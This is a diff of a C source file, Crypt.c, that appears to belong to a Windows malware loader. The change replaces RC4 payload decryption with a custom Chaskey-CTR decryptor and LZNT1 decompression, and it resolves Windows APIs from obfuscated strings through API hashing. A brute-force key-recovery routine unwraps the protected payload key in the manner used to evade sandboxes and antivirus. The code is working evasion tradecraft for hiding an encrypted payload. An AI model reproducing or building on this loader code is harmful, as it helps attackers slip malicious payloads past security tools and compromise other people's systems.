@@ -1,52 +1,143 @@
 // =============================================
-// Crypt.c - RC4 Decryption via SystemFunction032
+// Crypt.c - Chaskey-CTR Decryption
+//           + LZNT1 Decompression (ntdll)
 //           + Brute Force Key Recovery
 // =============================================
 
 #include "Common.h"
 
 // -----------------------------------------------
-// RC4 Decrypt payload using SystemFunction032
-// SystemFunction032 is an undocumented RC4 function
-// exported by advapi32.dll (forwarded from cryptsp.dll)
+// Chaskey-12 ARX permutation (128-bit block)
+// Lightweight block cipher — no S-boxes, no lookup
+// tables, no CRT dependencies. Pure ALU operations.
 // -----------------------------------------------
-BOOL Rc4DecryptPayload(
-    IN PAPI_HASHING pApi,
-    IN PBYTE        pCipherText,
-    IN DWORD        dwCipherSize,
-    IN PBYTE        pKey,
-    IN DWORD        dwKeySize
+#define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
+
+static void ChaskeyPermute(UINT32 v[4]) {
+    for (int i = 0; i < 12; i++) {
+        v[0] += v[1]; v[1] = ROTL32(v[1], 5);  v[1] ^= v[0]; v[0] = ROTL32(v[0], 16);
+        v[2] += v[3]; v[3] = ROTL32(v[3], 8);  v[3] ^= v[2];
+        v[0] += v[3]; v[3] = ROTL32(v[3], 13); v[3] ^= v[0];
+        v[2] += v[1]; v[1] = ROTL32(v[1], 7);  v[1] ^= v[2]; v[2] = ROTL32(v[2], 16);
+    }
+}
+
+// -----------------------------------------------
+// Chaskey-CTR Decrypt/Encrypt payload in-place
+//
+// Counter block: nonce[0..2] XOR key[0..2] + (counter XOR key[3])
+// Pre/post whitening with the key ensures diffusion.
+// -----------------------------------------------
+BOOL ChaskeyCtrDecrypt(
+    IN PBYTE pData,
+    IN DWORD dwSize,
+    IN PBYTE pKey,
+    IN PBYTE pNonce
 ) {
-    // Resolve SystemFunction032 from advapi32.dll (deobfuscated)
-    BYTE xAdv[] = XSTR_ADVAPI32_DLL;
-    DEOBF(xAdv);
-    HMODULE hAdvapi32 = pApi->pLoadLibraryA((LPCSTR)xAdv);
-    if (!hAdvapi32)
+    if (!pData || !pKey || !pNonce || dwSize == 0)
         return FALSE;
 
-    BYTE xSf032[] = XSTR_SYSTEM_FUNCTION032;
-    DEOBF(xSf032);
-    fnSystemFunction032 pSystemFunction032 = (fnSystemFunction032)pApi->pGetProcAddress(hAdvapi32, (LPCSTR)xSf032);
-    if (!pSystemFunction032)
+    UINT32 key[4];
+    MemCopy(key, pKey, 16);
+    UINT32 nonce[3];
+    MemCopy(nonce, pNonce, 12);
+
+    DWORD dwBlocks = (dwSize + 15) / 16;
+
+    for (DWORD blk = 0; blk < dwBlocks; blk++) {
+        UINT32 ctr[4] = {
+            nonce[0] ^ key[0],
+            nonce[1] ^ key[1],
+            nonce[2] ^ key[2],
+            blk      ^ key[3]
+        };
+
+        ChaskeyPermute(ctr);
+
+        // Post-whitening
+        ctr[0] ^= key[0];
+        ctr[1] ^= key[1];
+        ctr[2] ^= key[2];
+        ctr[3] ^= key[3];
+
+        // XOR keystream with data
+        DWORD dwOffset = blk * 16;
+        DWORD dwChunk  = dwSize - dwOffset;
+        if (dwChunk > 16) dwChunk = 16;
+
+        PBYTE pKs = (PBYTE)ctr;
+        for (DWORD i = 0; i < dwChunk; i++)
+            pData[dwOffset + i] ^= pKs[i];
+    }
+
+    // Wipe key material from stack
+    MemSet(key, 0, sizeof(key));
+    MemSet(nonce, 0, sizeof(nonce));
+
+    return TRUE;
+}
+
+// -----------------------------------------------
+// LZNT1 Decompression via ntdll RtlDecompressBuffer
+//
+// Resolves the function dynamically from ntdll
+// (already loaded). Zero additional DLL loads needed.
+// -----------------------------------------------
+#define COMPRESSION_FORMAT_LZNT1 0x0002
+
+typedef NTSTATUS(NTAPI* fnRtlDecompressBuffer)(
+    USHORT CompressionFormat,
+    PUCHAR UncompressedBuffer,
+    ULONG  UncompressedBufferSize,
+    PUCHAR CompressedBuffer,
+    ULONG  CompressedBufferSize,
+    PULONG FinalUncompressedSize
+);
+
+BOOL DecompressPayload(
+    IN  PAPI_HASHING pApi,
+    IN  PBYTE        pCompressed,
+    IN  DWORD        dwCompressedSize,
+    OUT PBYTE*       ppDecompressed,
+    IN  DWORD        dwOriginalSize
+) {
+    if (!pCompressed || !ppDecompressed || dwCompressedSize == 0 || dwOriginalSize == 0)
         return FALSE;
 
-    // Setup USTRING structures
-    USTRING Data = {
-        .Length         = dwCipherSize,
-        .MaximumLength  = dwCipherSize,
-        .Buffer         = pCipherText
-    };
+    BYTE xNtdll[] = XSTR_NTDLL_DLL;
+    DEOBF(xNtdll);
+    HMODULE hNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
+    if (!hNtdll)
+        return FALSE;
 
-    USTRING Key = {
-        .Length         = dwKeySize,
-        .MaximumLength  = dwKeySize,
-        .Buffer         = pKey
-    };
+    BYTE xDecomp[] = XSTR_RTL_DECOMPRESS_BUFFER;
+    DEOBF(xDecomp);
+    fnRtlDecompressBuffer pDecompress =
+        (fnRtlDecompressBuffer)pApi->pGetProcAddress(hNtdll, (LPCSTR)xDecomp);
+    if (!pDecompress)
+        return FALSE;
 
-    // RC4 decrypt in-place
-    NTSTATUS status = pSystemFunction032(&Data, &Key);
+    *ppDecompressed = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwOriginalSize);
+    if (!*ppDecompressed)
+        return FALSE;
 
-    return NT_SUCCESS(status);
+    ULONG ulFinalSize = 0;
+    NTSTATUS status = pDecompress(
+        COMPRESSION_FORMAT_LZNT1,
+        *ppDecompressed,
+        dwOriginalSize,
+        pCompressed,
+        dwCompressedSize,
+        &ulFinalSize
+    );
+
+    if (!NT_SUCCESS(status) || ulFinalSize != dwOriginalSize) {
+        HeapFree(GetProcessHeap(), 0, *ppDecompressed);
+        *ppDecompressed = NULL;
+        return FALSE;
+    }
+
+    return TRUE;
 }
 
 // -----------------------------------------------
@@ -66,26 +157,20 @@ BOOL BruteForceDecryption(
 
     BYTE b = 0;
 
-    // Brute force: find the XOR key byte
-    // Encryption was: pProtectedKey[i] = (pRealKey[i] + i) ^ b
-    // For i=0: pProtectedKey[0] = (HintByte + 0) ^ b = HintByte ^ b
-    // So: if (pProtectedKey[0] ^ b) == HintByte, we found b
     while (1) {
         if (((pProtectedKey[0] ^ b) - 0) == HintByte)
             break;
 
         if (b == 0xFF)
-            return FALSE;   // Exhausted all possibilities
+            return FALSE;
 
         b++;
     }
 
-    // Allocate buffer for decrypted key
     *ppRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sKeySize);
     if (!*ppRealKey)
         return FALSE;
 
-    // Reverse the encryption: pRealKey[i] = (pProtectedKey[i] ^ b) - i
     for (SIZE_T i = 0; i < sKeySize; i++) {
         (*ppRealKey)[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
     }
